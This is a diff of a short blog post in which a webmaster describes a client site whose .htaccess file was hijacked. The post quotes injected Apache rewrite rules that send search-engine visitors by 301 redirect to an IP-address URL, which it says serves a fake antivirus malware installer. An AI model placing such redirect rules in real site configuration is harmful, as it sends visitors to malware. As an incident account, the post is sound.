@@ -8,12 +8,10 @@ tags:
 ---
 
 Today a client called me telling me that its website was unavailable, or more
-exactly that the full content of the FTP was displayed instead of its
-homepage.
+exactly that the full content of the FTP was displayed instead of its homepage.
 
 After a little investigation it appears that the .htaccess file had been
-modified, here was the content I found :
-
+modified, here was the content I found:
 
 ```apache
 RewriteEngine On
@@ -43,7 +41,7 @@ RewriteCond %{HTTP_REFERER} .*dogpile.*
 RewriteRule ^(.*)$ http://217.23.5.232/hitin.php?land=20&affid=20116 [R=301,L]
 ```
 
-A little search online told me that this IP refer to a malware website
-launching a fake Antivirus software installation.
+A little search online told me that this IP refer to a malware website launching
+a fake Antivirus software installation.
 
 I have no idea how the `.htacces`s got modified, but I changed the FTP password.
